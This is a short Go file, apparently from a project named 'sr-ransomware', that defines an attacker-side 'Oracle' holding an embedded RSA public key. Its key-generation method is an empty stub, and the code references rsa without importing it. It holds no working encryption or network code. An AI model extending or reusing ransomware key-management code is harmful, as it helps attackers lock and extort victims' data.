package attacker

import (
    "path/filepath"

    "github.com/sug0/sr-ransomware/go/errors"
    "github.com/sug0/sr-ransomware/go/crypto/util"
)

//go:generate go run generate/key.go

type Oracle struct {
    key  *rsa.PublicKey
    path string
}

func NewOracle(path string) *Oracle {
    pk, _ := util.ImportDERPublicKeyRSA(oraclePublicKey)
    return &Oracle{key: pk, path: filepath.Clean(path)}
}

func (*Oracle) GenerateAndStoreKey() error {
    return nil
}
